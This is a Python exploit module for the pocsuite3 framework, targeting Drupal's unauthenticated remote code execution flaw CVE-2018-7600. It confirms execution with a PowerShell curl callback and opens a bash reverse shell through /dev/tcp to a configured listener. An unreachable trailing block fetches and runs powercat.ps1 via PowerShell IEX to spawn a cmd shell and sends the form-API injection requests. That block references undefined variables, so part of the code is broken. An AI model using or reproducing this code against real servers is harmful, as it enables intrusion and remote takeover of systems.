"""
If you have issues about development, please read:
https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md
for more about information, plz visit http://pocsuite.org
"""
from collections import OrderedDict
from urllib.parse import quote, urljoin, urlparse
from Framework.Library.Function.Function.PocSuite.shellcodes.php import *
from Framework.Library.Function.Function.PocSuite.lib.utils import random_str
from Framework.Library.Function.Function.PocSuite.api import POC_SCAN, Output, POCBase, POC_CATEGORY, register_poc, requests, REVERSE_PAYLOAD, OptDict, VUL_TYPE, logger, paths,get_listener_ip, get_listener_port
from Framework.Library.Function.Function.PocSuite.lib.utils import random_str
from bs4 import BeautifulSoup
import requests  # python-requests, eg. apt-get install python3-requests
import sys, os
import re
import binascii
from Framework.Library.Function.Function.PocSuite.Function import decode_data_input_poc
from Framework.Library.Function.Function.PocSuite.init_pocs.cve_2018_7600 import drupal_rce

class DemoPOC(POCBase):
    vulID = 'CVE-2018-7600'  # ssvid
    version = '1.0'
    author = ['khoa']
    vulDate = '28/03/2018'
    createDate = '2020-11-15'
    updateDate = '2020-11-15'
    references = ['https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7600']
    name = 'Drupal unauthenticated RCE'
    appPowerLink = {"typescan" : POC_SCAN.EXPLOITS.DIR,
                "language"  : [POC_SCAN.LANGUAGE.PHP],
		        "folder_init": "cve_2018_7600"}
    appName = 'drupal-cve-2018-7600'
    appVersion = 'CVE-2018-7600'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1 allows remote attackers to execute arbitrary code because of an issue affecting multiple subsystems with default or common module configurations'''
    samples = []
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    pocDesc = '''CVSS: 9.8 (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)'''
    url_result = {}


                
    def _verify(self, update=True):
        if update:
            config_input,  Referer = decode_data_input_poc(self.headers['Referer'])
            try:
                self.url = config_input['Input']['RECON_WEBAPP']
            except Exception as e:
                raise Exception("Error " +  self.appName +   " :" + str(e))
        result = {}
        result_url = []
        for url in self.url: 
            if drupal_rce.check_version(url): 
                result_url.append(url)
        if len(result_url) > 0: 
            result['VerifyInfo'] = {}
            result['VerifyInfo']['url'] = self.url
            result['VerifyInfo']['verify_url'] = "/CHANGELOG.txt"
        if update: 
            return self.parse_output(result)
        else: 
            return result
       

    def _attack(self):
        config_input,  Referer = decode_data_input_poc(self.headers['Referer'])

        try:
            self.url = config_input['Input']['RECON_WEBAPP']
            host_check_connect = config_input['Config']['Cf_Host_Check_Connect']# http://x.x.x.x:pppp
        except Exception as e:
            raise Exception("Error " +  self.appName +   " :" + str(e))
        result = {}
        self.vul_url = []
        self.cmd = ""
        if len(self._verify(update=False)) > 0: 
            for url in self.url: 
                flag = random_str(length=20)
                cmd = "powershell curl " + host_check_connect +"?data="+ flag
                drupal_rce.exploit(url, cmd)
                data_request_log = {
                    "data": "{}".format(flag)
                } 
                host_check = "{}/logrequestbin".format(host_check_connect)
                check = requests.get(host_check, params=data_request_log)
                if flag in check.text: 
                    self.vul_url.append(url)
                    self.cmd = cmd
            if len(self.vul_url) > 0: 
                result['ShellInfo'] = {}
                result['ShellInfo']['url'] =  self.vul_url
                result['ShellInfo']['cmd'] = self.cmd
                result['ShellInfo']['info'] = '''Drupal CMS RCE CVE-2018-7600 ''' 
                return self.parse_output(result)
            else: 
                return self.parse_output(False)
        else: 
            return self.parse_output(False)    




    def _shell(self):
        result = {}
        result['ShellInfo'] = {
                'Status': 'Success'
            }
        try:
            config_input,  Referer = decode_data_input_poc(self.headers['Referer'])
            try:
                self.url = config_input['Input']['EXPLOIT_POCS']
                lhost_running = config_input['Config']['Cf_PublicIP']
                lport_running = config_input['Config']['Cf_PublicPort']
                
            except Exception as e:
                raise Exception("Error " +  self.appName +   " :" + str(e))

            self.url = self.url[0]['result']['ShellInfo']['url'][0]

            cmd = "/bin/bash -c 'bash -i >&/dev/tcp/{}/{} 0>&1'".format(lhost_running, lport_running)

            drupal_rce.exploit(self.url, cmd)
            result['ShellInfo']["url"] = self.url
            result['ShellInfo']["info_reverse_shell"] = {
                "PublicIP": lhost_running,
                "PublicPort": lport_running
            }
            result['ShellInfo']['payload'] = cmd
            return self.parse_output(result)

        except Exception as e: 
            if type(e) == requests.exceptions.ReadTimeout: 
                return self.parse_output(result)
            print("Error run shell ", self.name, e)
            pass
        return self.parse_output(False)










        config_input,  Referer = decode_data_input_poc(self.headers['Referer'])

        try:
            self.url = config_input['Input']['RECON_WEBAPP']
            host_check_connect = config_input['Config']['Cf_Host_Check_Connect']# http://x.x.x.x:pppp
        except Exception as e:
            raise Exception("Error " +  self.appName +   " :" + str(e))
        
        urlexploit = datainput['entrypoint']
        REVERSE_SHELL_IP = datainput['LHOST']
        REVERSE_SHELL_PORT = str(datainput['LPORT'])
        cmd = '''powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://{}:65535/powercat.ps1');powercat -c {} -p {} -e cmd"'''.format(PUBLIC_IP, REVERSE_SHELL_IP, REVERSE_SHELL_PORT)
        get_params1 = {'q':'user/password', 'name[#post_render][]':'exec', 'name[#type]':'markup', 'name[#markup]': cmd}
        post_params1 = {'form_id':'user_pass', '_triggering_element_name':'name', '_triggering_element_value':'', 'opz':'E-mail new Password'}
        r = requests.post(urlexploit + "/user/register", params=get_params1, data=post_params1, verify=False)
        soup = BeautifulSoup(r.text, "html.parser")
        form = soup.find('form', {'id': 'user-pass'})
        form_build_id = form.find('input', {'name': 'form_build_id'}).get('value')
        if form_build_id:
            get_params = {'q':'file/ajax/name/#value/' + form_build_id}
            post_params = {'form_build_id':form_build_id}
            r = requests.post(urlexploit + "/user/register", params=get_params, data=post_params, verify=False)
            
        
   

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(DemoPOC)
